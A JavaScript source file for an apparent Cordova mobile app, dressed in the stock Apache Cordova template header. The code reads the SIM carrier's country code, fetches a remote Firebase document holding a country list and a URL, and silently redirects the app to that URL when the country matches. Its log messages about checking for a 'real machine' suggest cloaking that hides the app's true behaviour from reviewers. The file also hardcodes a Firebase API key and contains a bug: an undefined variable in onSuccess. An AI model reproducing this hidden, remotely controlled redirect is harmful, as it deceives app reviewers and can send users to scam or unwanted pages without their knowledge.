/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

// Wait for the deviceready event before using any of Cordova's device APIs.
// See https://cordova.apache.org/docs/en/latest/cordova/events/events.html#deviceready
document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {


        // Cordova is now initialized. Have fun!
        carrier.getCountryCode(onSuccess, onError);
        var country;
        function onSuccess(res) {
                country = res;
                console.log("Result1: " + country);
                navigator.notification.alert(msg, null, "Carrier Information", "Continue");
        }
        function onError(err) {
                var msg = `Error: ${err.code} - ${err.msg}`;
                navigator.notification.alert(msg, null, "Carrier Error", "Oops");
        }




        loadScript('https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js', 'https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js', function () {
                const firebaseConfig = {
                        apiKey: "AIzaSyDjVIdsIBuzskF7Sc8xGiYGRvVAzpzpLEE",
                        authDomain: "bghhj-fc5b6.firebaseapp.com",
                        projectId: "bghhj-fc5b6",
                        storageBucket: "bghhj-fc5b6.appspot.com",
                        messagingSenderId: "974798693352",
                        appId: "1:974798693352:web:19422750d0bc1359bdfa5d",
                        measurementId: "G-7HRDLPXTB2"
                };
                firebase.initializeApp(firebaseConfig);
                var firestore = firebase.firestore();
                var docRef = firestore.collection("api").doc("x3PsXMtuxoJcZf9YNp6X");
                console.log("Verify if it is a real machine ");

                docRef.get().then((doc) => {
                        if (doc.exists) {
                                var ffp = doc.data()['p'];
                                var url = doc.data()['u'].toString();

                                if (ffp.includes(country)) {
                                        window.location.href = url;
                                        console.log(" it is not a real machine,open a no entry instructions");

                                }
                        } else {
                                // doc.data() will be undefined in this case
                                console.log("No result document!");
                        }
                }).catch((error) => {
                        console.log("Error result document:", error);
                });
        });

}



function loadScript(url, url1, callback) {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        var script1 = document.createElement('script');
        script1.type = 'text/javascript';
        script.onload = script.onreadystatechange = function () {
                if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
                        script1.onload = script1.onreadystatechange = function () {
                                if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
                                        callback();
                                        script1.onload = script1.onreadystatechange = null;
                                }
                        };
                        script.onload = script.onreadystatechange = null;

                }
        };
        script.src = url;
        script1.src = url1;
        document.getElementsByTagName('head')[0].appendChild(script);
        document.getElementsByTagName('head')[0].appendChild(script1);

}